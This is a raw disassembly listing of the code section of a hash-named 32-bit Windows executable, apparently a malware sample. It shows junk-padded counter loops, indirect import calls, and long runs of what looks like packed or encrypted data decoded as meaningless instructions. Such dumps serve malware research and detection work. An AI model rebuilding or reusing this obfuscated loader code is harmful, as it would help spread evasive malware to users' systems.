
4932d19327b1450465d620936575e69a317cf584c520d6996e8a68638926d093.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [edi-0x49],ah
  4011b9:	std    
  4011ba:	loope  0x40123a
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [ebp+0xf330f00],edi
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x28b8b737
  40126d:	sub    dl,BYTE PTR [edi+0x62]
  401270:	lods   eax,DWORD PTR ds:[esi]
  401271:	push   edi
  401272:	test   BYTE PTR [eiz*4-0x7c588045],ch
  401279:	jp     0x401278
  40127b:	jp     0x40123b
  40127d:	mov    edx,0x56445077
  401282:	stos   DWORD PTR es:[edi],eax
  401283:	cmp    esp,esp
  401285:	xchg   edi,eax
  401286:	sti    
  401287:	sbb    BYTE PTR [ebx-0x6f15444a],dl
  40128d:	xchg   esi,eax
  40128e:	cmp    eax,0x8ef155d8
  401293:	xlat   BYTE PTR ds:[ebx]
  401294:	std    
  401295:	fcomip st,st(2)
  401297:	push   0x2a
  401299:	out    dx,eax
  40129a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40129b:	xor    cl,BYTE PTR [edx+ebp*2]
  40129e:	xchg   bl,bl
  4012a0:	xchg   esp,eax
  4012a1:	sahf   
  4012a2:	call   0xbd289893
  4012a7:	rcr    DWORD PTR [edi-0x5f],0xb2
  4012ab:	cmc    
  4012ac:	shl    dh,0x73
  4012af:	lea    esi,[edi+ebx*1]
  4012b2:	xchg   DWORD PTR [edi],edi
  4012b4:	mov    bl,0x89
  4012b6:	mov    cl,0x5
  4012b8:	push   DWORD PTR [edi+0x7]
  4012bb:	shr    DWORD PTR [ebp-0x68],0x62
  4012bf:	jge    0x4012e3
  4012c1:	fcomp  QWORD PTR [ebp+0x7615f070]
  4012c7:	fnsave [ebx+esi*2+0x13]
  4012cb:	inc    eax
  4012cc:	pop    ss
  4012cd:	inc    ecx
  4012ce:	(bad)  es:[edi]
  4012d1:	sub    eax,0x5bfb5379
  4012d6:	and    al,0x2f
  4012d8:	js     0x40133f
  4012da:	shr    WORD PTR [eax+ebx*8],1
  4012de:	jmp    0xe263:0x67ba52ca
  4012e5:	inc    esi
  4012e7:	cmp    edi,DWORD PTR [ebp+0x342bfd2a]
  4012ed:	sub    ch,bl
  4012ef:	inc    edi
  4012f0:	ins    DWORD PTR es:[edi],dx
  4012f1:	js     0x4012b2
  4012f3:	shl    BYTE PTR [ebx],1
  4012f5:	leave  
  4012f6:	xlat   BYTE PTR ds:[ebx]
  4012f7:	push   ecx
  4012f8:	aaa    
  4012f9:	bound  ebx,QWORD PTR [edx]
  4012fb:	mov    dh,0x8e
  4012fd:	jb     0x401337
  4012ff:	sub    DWORD PTR [edi],eax
  401301:	mov    ds:0x19d7620,eax
  401306:	pushf  
  401307:	sub    BYTE PTR [esi+0x6087fc1e],0x2c
  40130e:	push   esp
  40130f:	jo     0x401360
  401311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401312:	pop    edx
  401313:	adc    ecx,DWORD PTR [ebp+ebp*8-0x61954638]
  40131a:	lock jg 0x40130f
  40131d:	or     ebx,edx
  40131f:	mov    ch,0x93
  401321:	jg     0x40134c
  401323:	arpl   WORD PTR [ecx-0x1c],cx
  401326:	inc    edi
  401327:	adc    al,0x30
  401329:	mov    al,ds:0x93f32d1c
  40132e:	loop   0x4012b0
  401330:	add    al,0xea
  401332:	stos   BYTE PTR es:[edi],al
  401333:	test   eax,0x528e2c0b
  401338:	add    ch,dl
  40133a:	push   0xcb088e42
  40133f:	pusha  
  401340:	mov    WORD PTR [ebp+0x18],gs
  401343:	jne    0x4013b8
  401345:	into   
  401346:	xlat   BYTE PTR ds:[ebx]
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	cmp    esi,0xffffffc5
  4013b6:	dec    edx
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013e3
  4013c0:	xlat   BYTE PTR ds:[ebx]
  4013c1:	int3   
  4013c2:	mov    BYTE PTR [ecx],ch
  4013c4:	push   ds
  4013c5:	cmp    bh,BYTE PTR [ecx+0x33]
  4013c8:	push   ebx
  4013c9:	add    al,0x23
  4013cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013cc:	int    0x26
  4013ce:	or     ebp,DWORD PTR [edx+0x8]
  4013d1:	outs   dx,BYTE PTR ds:[esi]
  4013d2:	mov    BYTE PTR [esi+0x6146926b],al
  4013d8:	iret   
  4013d9:	outs   dx,DWORD PTR ds:[esi]
  4013da:	pop    edi
  4013db:	add    eax,0x50a278c3
  4013e0:	xchg   esp,eax
  4013e1:	push   ebp
  4013e2:	aam    0x78
  4013e4:	jmp    FWORD PTR [ebx+0x36]
  4013e7:	ja     0x40145c
  4013e9:	inc    esp
  4013ea:	sub    bh,al
  4013ec:	pusha  
  4013ed:	dec    ebp
  4013ee:	xchg   edi,eax
  4013ef:	xchg   esp,eax
  4013f0:	ds stos BYTE PTR es:[edi],al
  4013f2:	lds    ebx,FWORD PTR [edi-0x7b]
  4013f5:	mov    eax,ds:0x87d245a1
  4013fa:	fadd   st(3),st
  4013fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013fd:	jg     0x40142c
  4013ff:	inc    BYTE PTR ds:0x5c5ddad6
  401405:	dec    edx
  401406:	popf   
  401407:	sbb    ebp,DWORD PTR [eax]
  401409:	xor    BYTE PTR [ecx],ah
  40140b:	imul   edx,DWORD PTR [ecx+0x7d0eebaa],0xa9de15cd
  401415:	das    
  401416:	gs push esi
  401418:	xor    esi,eax
  40141a:	fbld   TBYTE PTR [ecx+0x44]
  40141d:	cwde   
  40141e:	and    DWORD PTR [esi],edx
  401420:	mov    al,ds:0xd5bbf85f
  401425:	or     BYTE PTR [edx+esi*1+0x33bb4864],ah
  40142c:	pop    ds
  40142d:	and    al,0xc2
  40142f:	mov    bl,0x5e
  401431:	cmp    al,0x99
  401433:	mov    ah,BYTE PTR [eax-0x457b7222]
  401439:	es mov edi,0x961aaa90
  40143f:	sbb    esp,esi
  401441:	add    eax,0x7d7a3318
  401446:	jne    0x40141b
  401448:	cli    
  401449:	test   eax,0xb2f06e64
  40144e:	std    
  40144f:	sbb    BYTE PTR [edi+0x1b],ah
  401452:	mov    al,bh
  401454:	(bad)  
  401455:	cmp    ah,BYTE PTR ds:0x4242e53b
  40145b:	stos   DWORD PTR es:[edi],eax
  40145c:	fs aas 
  40145e:	shr    BYTE PTR [edx+eiz*2+0x7a],0x5b
  401463:	jnp    0x401489
  401465:	sub    ch,al
  401467:	sub    dh,cl
  401469:	jmp    DWORD PTR [ebp+eax*8-0x30bfbc04]
  401470:	ss mov ebp,ecx
  401473:	cmp    al,0xd
  401475:	rol    esp,1
  401477:	jg     0x401480
  401479:	mov    dl,0xd8
  40147b:	fcomp  QWORD PTR [eax-0x1fb5bc81]
  401481:	fwait
  401482:	or     edx,DWORD PTR [edx]
  401484:	aam    0xa5
  401486:	lock cwde 
  401488:	mov    cl,0x9f
  40148a:	xchg   ch,bl
  40148c:	icebp  
  40148d:	jle    0x4014d2
  40148f:	lock (bad) 
  401491:	cmp    edx,DWORD PTR [eax]
  401493:	push   0x76dd6985
  401498:	mov    edi,0xa58f15ee
  40149d:	call   0x740b:0x569f6437
  4014a4:	mov    ch,0xeb
  4014a6:	std    
  4014a7:	data16 (bad) 
  4014aa:	pop    edi
  4014ab:	pop    esi
  4014ac:	and    al,0x23
  4014ae:	mov    ecx,0x73675d4b
  4014b3:	enter  0x5fb3,0x6b
  4014b7:	push   ebp
  4014b8:	fmul   DWORD PTR [eax+0x30644313]
  4014be:	jb     0x4014bb
  4014c0:	dec    ebx
  4014c1:	pop    es
  4014c2:	mov    dl,0xd
  4014c4:	mov    cl,0x66
  4014c6:	inc    eax
  4014c7:	dec    edx
  4014c8:	mov    esp,0x86fd9d69
  4014cd:	jle    0x401530
  4014cf:	sti    
  4014d0:	sar    DWORD PTR [eax+0x554786c6],1
  4014d6:	inc    ebp
  4014d7:	jns    0x4014c6
  4014d9:	sbb    bh,BYTE PTR [edx-0x2398380f]
  4014df:	cmc    
  4014e0:	pop    ds
  4014e1:	test   eax,0xbf99892f
  4014e6:	add    eax,0xe4fc9853
  4014eb:	pop    ebp
  4014ec:	stc    
  4014ed:	add    ch,bl
  4014ef:	sub    DWORD PTR [esi-0x359ff7d3],edi
  4014f5:	shl    DWORD PTR cs:[ebp+0x437f01cf],cl
  4014fc:	fidivr DWORD PTR [eax]
  4014fe:	adc    al,0xca
  401500:	and    eax,0xe00f6e77
  401505:	adc    BYTE PTR [ebx-0x34],bl
  401508:	add    esp,edi
  40150a:	jp     0x4014a8
  40150c:	sbb    bl,bl
  40150e:	pop    edx
  40150f:	jp     0x4014b5
  401511:	int    0xc8
  401513:	or     eax,0x4e082c1c
  401518:	ds cld 
  40151a:	retf   0xd51b
  40151d:	xor    DWORD PTR [ebp+0x1a267af3],eax
  401523:	cmp    al,0x1
  401525:	mov    bh,dl
  401527:	and    ecx,DWORD PTR [ecx+0x3a]
  40152a:	(bad)  
  40152b:	pop    ss
  40152c:	loope  0x40151f
  40152e:	jno    0x401500
  401530:	std    
  401531:	iret   
  401532:	popa   
  401533:	clc    
  401534:	jl     0x40156e
  401536:	xchg   ecx,eax
  401537:	popf   
  401538:	jg     0x401522
  40153a:	sub    DWORD PTR [ecx-0x6fc1a704],esi
  401540:	xor    BYTE PTR [ecx-0x14],ah
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43370f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x2ca69ae3]
  401564:	xchg   ebx,eax
  401565:	push   es
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015bc
  40156e:	scas   eax,DWORD PTR es:[edi]
  40156f:	push   edx
  401570:	push   edi
  401571:	and    BYTE PTR [ebx-0x29beb3fe],ch
  401577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401578:	out    dx,eax
  401579:	pusha  
  40157a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40157b:	mov    al,0xa1
  40157d:	ret    0xc4fe
  401580:	sub    BYTE PTR [edi+0x48624b4b],ch
  401586:	lds    esi,FWORD PTR [edi]
  401588:	cwde   
  401589:	fnstsw WORD PTR [ecx]
  40158b:	sub    BYTE PTR [eax],bl
  40158d:	jp     0x401596
  40158f:	aaa    
  401590:	mov    DWORD PTR [eax+0x7dfd7b84],edi
  401596:	adc    al,0xdd
  401598:	push   esp
  401599:	dec    ecx
  40159a:	push   0xffffffbc
  40159c:	mov    DWORD PTR [edx+eax*4],esp
  40159f:	icebp  
  4015a0:	cs sub ch,bl
  4015a3:	or     al,dh
  4015a5:	pop    ss
  4015a6:	jbe    0x4015bc
  4015a8:	call   0xed3235f2
  4015ad:	jp     0x401564
  4015af:	std    
  4015b0:	mov    bh,0xea
  4015b2:	xchg   ebx,eax
  4015b3:	ins    BYTE PTR es:[edi],dx
  4015b4:	or     ch,cl
  4015b6:	int    0x49
  4015b8:	rcl    DWORD PTR [esi-0x2d],0xa5
  4015bc:	outs   dx,DWORD PTR ds:[esi]
  4015bd:	sub    DWORD PTR [esi-0x760b299b],esp
  4015c3:	adc    eax,0x9f2a2d6a
  4015c8:	icebp  
  4015c9:	nop
  4015ca:	jo     0x401624
  4015cc:	mov    ch,0x55
  4015ce:	call   0xd2a4:0x6cba68f0
  4015d5:	inc    ebx
  4015d6:	retf   0x1b46
  4015d9:	or     DWORD PTR [edx+0x7829af8],ebx
  4015df:	jbe    0x4015a4
  4015e1:	scas   al,BYTE PTR es:[edi]
  4015e2:	sahf   
  4015e3:	mov    WORD PTR [ebx],fs
  4015e5:	xchg   esi,eax
  4015e6:	repz xor BYTE PTR [ecx-0x52],dh
  4015ea:	xchg   ebp,eax
  4015eb:	jae    0x401647
  4015ed:	and    BYTE PTR [edi],dh
  4015ef:	adc    al,0x69
  4015f1:	loope  0x4015b2
  4015f3:	rol    DWORD PTR [ebx+ebp*8],0xb
  4015f7:	push   0x8136ec34
  4015fc:	mov    dh,BYTE PTR [eax]
  4015fe:	(bad)  
  4015ff:	loope  0x40166e
  401601:	jo     0x401616
  401603:	mov    WORD PTR [edi],fs
  401605:	aad    0x70
  401607:	sar    DWORD PTR [ecx-0x30],cl
  40160a:	shl    BYTE PTR [esi+ecx*1],1
  40160d:	fild   DWORD PTR [ebx]
  40160f:	sub    ecx,ebx
  401611:	pop    ebp
  401612:	xchg   edx,eax
  401613:	popf   
  401614:	adc    bl,cl
  401616:	out    dx,eax
  401617:	sti    
  401618:	test   dh,ch
  40161a:	or     al,0xcc
  40161c:	add    eax,0x1ab766a6
  401621:	cwde   
  401622:	xchg   esi,eax
  401623:	or     al,0x22
  401625:	push   edi
  401626:	in     eax,dx
  401627:	sbb    ah,BYTE PTR [ebp+0x472acec0]
  40162d:	repz call 0xd586:0xd6cdaba2
  401635:	in     al,dx
  401636:	das    
  401637:	sub    eax,0xecc93b3f
  40163c:	pop    es
  40163d:	test   eax,0x24f70047
  401642:	(bad)  
  401643:	jmp    0x68556166
  401648:	or     al,0xc1
  40164a:	inc    esi
  40164b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40164c:	enter  0x9c69,0x94
  401650:	cmp    BYTE PTR [ebx-0x288d0551],bh
  401656:	jae    0x401689
  401658:	lods   eax,DWORD PTR ds:[esi]
  401659:	sar    DWORD PTR [edi-0x79ead3b6],0xe5
  401660:	shr    DWORD PTR [esi],0x5
  401663:	xchg   ebp,eax
  401664:	mov    bh,0x40
  401666:	jne    0x4016d7
  401668:	retf   
  401669:	mov    dh,ah
  40166b:	jecxz  0x401638
  40166d:	pop    edi
  40166e:	mov    al,ds:0xdfd2f197
  401673:	mov    cl,0x70
  401675:	clc    
  401676:	sbb    ebx,ecx
  401678:	cmp    edx,esi
  40167a:	or     DWORD PTR [ebx-0x4f966311],ebx
  401680:	jge    0x401694
  401682:	mov    al,0x64
  401684:	sbb    al,cl
  401686:	dec    esp
  401687:	pop    edi
  401688:	imul   ebp,DWORD PTR [ebx+0x5a5f06a7],0x6a
  40168f:	dec    esp
  401690:	or     cl,BYTE PTR [ebp+0x1]
  401693:	rcl    BYTE PTR [ebp+0x41],cl
  401696:	clc    
  401697:	add    DWORD PTR [edx+0x2a],edx
  40169a:	repz mov ah,0x55
  40169d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40169e:	sbb    BYTE PTR [edx-0x7c],dh
  4016a1:	inc    ebx
  4016a2:	lods   al,BYTE PTR ds:[esi]
  4016a3:	mov    ebp,0xc132ae0f
  4016a8:	xor    eax,0xfadf98ac
  4016ad:	and    ch,0xb
  4016b0:	lock xchg BYTE PTR [eax],cl
  4016b3:	(bad)  
  4016b4:	std    
  4016b5:	sti    
  4016b6:	pop    edx
  4016b7:	mov    BYTE PTR [ebx+eiz*4],cl
  4016ba:	ds or  al,0xc5
  4016bd:	add    eax,0xd816b235
  4016c2:	and    al,0xaf
  4016c4:	mov    ah,0x8b
  4016c6:	inc    ebx
  4016c7:	aaa    
  4016c8:	or     al,0x3e
  4016ca:	cmp    DWORD PTR [eax-0x41d187c4],esp
  4016d0:	shr    ebx,1
  4016d2:	mov    cl,0xc9
  4016d4:	retf   
  4016d5:	push   eax
  4016d6:	mov    al,ds:0xc17a8278
  4016db:	sti    
  4016dc:	jbe    0x401737
  4016de:	call   0x5266:0x63805251
  4016e5:	fcomp  QWORD PTR [ecx]
  4016e7:	jge    0x40171e
  4016e9:	xchg   ebx,eax
  4016ea:	lock dec ebp
  4016ec:	mov    dh,0x6d
  4016ee:	(bad)  
  4016ef:	fstp   QWORD PTR [eax+0x3]
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xef406ade
  4018e9:	cmp    DWORD PTR [edi-0x7e],ebp
  4018ec:	jp     0x40196c
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x401896
  4018f4:	call   FWORD PTR [ebx]
  4018f6:	(bad)  
  4018f7:	inc    esp
  4018f8:	or     al,0xaa
  4018fa:	cld    
  4018fb:	mov    dl,BYTE PTR [esi+ebx*2]
  4018fe:	pop    esi
  4018ff:	mov    ss,WORD PTR [ecx]
  401901:	aam    0x87
  401903:	inc    ecx
  401904:	dec    ecx
  401905:	adc    edx,ebx
  401907:	pushf  
  401908:	sub    eax,esi
  40190a:	icebp  
  40190b:	inc    esp
  40190c:	sbb    eax,0x5699efac
  401911:	outs   dx,DWORD PTR ds:[esi]
  401912:	scas   eax,DWORD PTR es:[edi]
  401913:	and    eax,0xb1efd907
  401918:	adc    al,0xbf
  40191a:	mov    ?,WORD PTR [esi]
  40191c:	xchg   ebx,eax
  40191d:	rol    BYTE PTR [ebx+0x7],0x89
  401921:	cld    
  401922:	jecxz  0x4018e8
  401924:	xlat   BYTE PTR ds:[ebx]
  401925:	dec    ebp
  401926:	cwde   
  401927:	fimul  WORD PTR [ebp+eax*8+0x62]
  40192b:	xchg   ecx,eax
  40192c:	je     0x4019a4
  40192e:	mov    ds:0x1054271b,eax
  401934:	sub    al,0x84
  401936:	sbb    BYTE PTR [ecx+0x1f78eec1],ah
  40193c:	sbb    BYTE PTR [ecx+0x2b27795a],ch
  401942:	xor    esp,edx
  401944:	cmp    ecx,DWORD PTR [ebp-0x557f7c20]
  40194a:	sbb    eax,DWORD PTR [ebx]
  40194c:	or     BYTE PTR [esi+0x1a],ah
  40194f:	cmp    DWORD PTR [ebp-0x1d48289],ebp
  401955:	and    DWORD PTR [eax-0x7e],edi
  401958:	dec    edi
  401959:	inc    ebp
  40195a:	inc    ebp
  40195b:	lods   al,BYTE PTR ds:[esi]
  40195c:	mov    BYTE PTR [eax],ch
  40195e:	mov    dl,0xdb
  401960:	not    dl
  401962:	inc    esi
